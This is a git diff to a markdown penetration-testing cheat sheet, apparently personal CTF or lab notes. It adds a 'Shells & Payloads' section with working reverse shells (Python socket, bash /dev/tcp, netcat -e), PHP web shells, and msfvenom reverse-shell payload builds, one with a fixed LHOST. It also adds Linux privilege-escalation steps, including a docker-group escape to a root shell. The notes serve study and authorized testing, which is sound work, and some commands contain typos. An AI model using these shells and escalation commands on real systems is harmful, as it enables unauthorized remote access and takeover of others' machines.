@@ -18,9 +18,12 @@ Enumeration, exploitation, and privilege escalation notes, all in one place.
     - [Password Mutations](#password-mutations)
     - [Remote Attacks](#remote-attacks)
     - [Cracking Passwords](#cracking-passwords)
+  - [Shells & Payloads](#shells-&-payloads)
 - [Privilege Escalation](#privilege-escalation)
-- [Post-Exploitation](#post-exploitation)
-- [Resources](#resources)
+  - [Linux PE](#linux-pe)
+- [Arsenal](#arsenal)
+  - [Python Virtual Environment](#python-virtual-enviroment)
+  - [File Transfers](#file-transfers)
 
 
 ## Useful Sites
@@ -35,36 +38,30 @@ Enumeration, exploitation, and privilege escalation notes, all in one place.
 # Enumeration
 
 ### Network-Scanning
-nmap service scan
 ```bash
+# nmap service scan
 nmap -sCV -T4 -p- <IP> -oN test_scan.txt
-```
-nmap udp scan
-```bash
+
+# nmap udp scan
 namp -sU <IP> --top-ports 100 --min-rate 5000 -oN test_scanudp.txt
-```
-rustscan with nmap
-```bash
+
+# rustscan with nmap
 rustscan -a <IP> -- -sV -sC -oN nmap_output.txt
 ```
 
 ## Web Enumeration
 
-FFUF directory scan
 ```bash
+# FFUF directory scan
 ffuf -w ~/Wordlists/SecLists/Discovery/xx:FUZZ -u http://<IP>:x/FUZZ
-```
-FFUF vHost scan
-```bash
-ffuf -u http://<IP>.x -c -w ~/Wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'HOST: FUZZ.<IP>.x' -fs 0 
-```
 
-Dirsearch directory scan
-```bash
+# FFUF vHost scan
+ffuf -u http://<IP>.x -c -w ~/Wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'HOST: FUZZ.<IP>.x' -fs 0 
+
+# Dirsearch directory scan
 dirsearch -h http://<IP>/
-```
-Nikto Scan
-```bash
+
+# Nikto scan
 nikto -h http://<IP>/
 ```
 ## Footprinting
@@ -117,6 +114,7 @@ mysql (add end method if TSL/SSL error appears)
 ```bash
 mysql -h <IP> -u <USER> -p --skip-ssl
 ```
+mssql
 ```bash
 impacket-mssqlclient <user>@<FQDN/IP> -windows-auth
 ```
@@ -151,11 +149,10 @@ xp_cmdshell 'whoami'
 ### Password Mutations
 ```bash
 # cewl to generate a wordlist based on keywords present on a website.
-cewl https://TARGET/ -d 4 -m 6 --lowercase -w TARGET.wordlist
+cewl https://<IP>/ -d 4 -m 6 --lowercase -w TARGET.wordlist
 
-```bash
+# cewl to generate a wordlist minimum 5 words with depth of 5
 cewl -d 5 -m 3 http://<IP>/ > TARGET.txt
-```z
 
 # Hashcat to generate a rule-based word list.
 hashcat --force password.list -r custom.rule --stdout > mut_password.list
@@ -203,4 +200,100 @@ keepass2john Protected.kdbx > protected-kdbx.hash
 bitlocker2john Protected.raw > protected-bl.hash
 zip2john Protected.zip > protected-zip.hash
 pdf2john Protected.pdf > protected-pdf.hash
+``` 
+## Shells & Payloads
+- [RevShell-CheatSheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+### Interactive Shells TTY
+```bash
+python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+(crtl + z)
+stty raw -echo && fg
+export TERM=xterm
+
+# Invoke a shell from established shell
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+### PHP & Python Shells
+```php
+# Simple Web Shell
+<?php system($_GET['cmd']); ?>
+
+<?php system($_REQUEST['cmd']); ?>
+
+# Python Rev Shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+<?php system('nc <IP> <PORT> -e /bin/bash')?>
+```
+### Bash Shells
+```bash
+# Bash Rev Shell
+bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+
+# Wrapped Bash Shell
+bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
+```
+### msfvenom
+```bash
+# List payloads
+msfvenom -l payloads
+
+# Stageless payload
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=1337 -f elf > createbackup.elf
+
+# Windows payload
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > Revenue.exe
+```
+# Privilege Escalation
+## Linux PE
+- [GTFOBins](https://gtfobins.github.io/)
+- [pspy](https://www.kali.org/tools/pspy/)
+- [linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
+- [enum4linux](https://www.kali.org/tools/enum4linux/)
+### Linux Search 
+```bash
+
+# Search for file types
+find . -type f -iname '*db*' -print
+
+# Search for writable files
+find / -writable -type d 2>/dev/null
+
+# Search for SUID
+find / -perm -u=s -type f 2>/dev/null
+
+# Search for Capabilities
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+
+# Search for User specific executables and files
+find / -user USER -perm -u=wrx 2>/dev/null
+
+# Check for Permissions
+ls -l /
+```
+### Docker Group
+```bash
+# Check group and if docker.sock is root owned
+etent group docker
+docker:x:115:selena
+
+ls -l /var/run/docker.sock
+srw-rw---- 1 root docker 0 Mar  1  2025 /var/run/docker.sock
+
+# Spawn an interactive shell as root
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+# Arsenal
+## Python Virtual Environment
+```bash
+
+python3 -m venv /.venv
+
+source venv/bin/activate
+
+deactivate
+```
+## File Transfers
